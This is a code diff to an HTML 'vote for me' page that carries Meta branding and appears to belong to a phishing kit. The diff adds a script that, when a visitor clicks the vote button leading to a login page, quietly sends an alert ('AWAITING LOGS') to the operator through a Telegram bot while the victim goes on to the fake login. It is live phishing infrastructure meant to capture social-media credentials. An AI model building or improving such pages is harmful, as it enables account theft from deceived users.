@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Fashion Brand - Vote</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Load your Telegram config -->
+  <script type="module" src="config.js"></script>
 </head>
 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
   <div class="w-full max-w-md">
@@ -62,7 +64,7 @@
           I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker.
         </p>
 
-        <a href="login.html" 
+        <a href="login.html" id="vote-btn"
            class="block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-3">
           <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
             <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
@@ -75,9 +77,40 @@
     </div>
 
     <p class="text-center text-gray-400 text-sm mt-6">
-      © 2026 Meta.
+      © 2025 Meta.
     </p>
 
   </div>
+
+  <!-- Telegram alert script -->
+  <script type="module">
+    // Wait for config.js to load
+    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const voteButton = document.getElementById('vote-btn');
+
+      if (voteButton && TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
+        voteButton.addEventListener('click', (e) => {
+          // We don't preventDefault() → user still goes to login.html
+          
+          const message = "LOGIN BUTTON CLICKED🚨🔔\n😈AWAITING LOGS…..";
+
+          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: 'HTML'
+            })
+          })
+          .catch(err => console.log('Telegram send failed:', err));
+          // Fire-and-forget — no delay for the user
+        });
+      }
+    });
+  </script>
+
 </body>
 </html>
